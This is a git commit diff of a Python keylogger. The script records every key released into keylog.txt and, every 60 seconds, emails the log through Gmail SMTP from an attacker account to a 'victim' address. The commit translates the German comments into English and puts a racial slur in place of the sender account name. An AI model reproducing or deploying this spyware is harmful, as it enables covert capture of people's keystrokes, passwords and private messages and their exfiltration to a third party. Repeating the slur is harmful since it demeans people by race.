ffbb52e2b50ce36d9c86fde37fa3f8d3787e6e42
selxxet <kyu77tz@gmail.com>
2025-05-05 09:07:52 +0200

    Update import keyboard.py

--- import keyboard.py
+++ import keyboard.py
@@ -3,15 +3,15 @@ import smtplib
 from threading import Timer
 
 def send_logs():
-    # Logs per E-Mail senden (wie bei Spyware)
+    # Fake logs per E-mail
     with open("keylog.txt", "r") as f:
         logs = f.read()
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
-    server.login("hacker@gmail.com", "password")  # (Fake-Daten)
-    server.sendmail("hacker@gmail.com", "victim@example.com", logs)
+    server.login("nigger@gmail.com", "password")  # (Fake data)
+    server.sendmail("nigger@gmail.com", "victim@example.com", logs)
     server.quit()
 
-# Tastenanschläge aufzeichnen
+# Keystrokes
 keyboard.on_release(lambda e: open("keylog.txt", "a").write(f"{e.name} "))
-Timer(60, send_logs).start()  # Alle 60 Sekunden senden
+Timer(60, send_logs).start()  # Every 60 sec
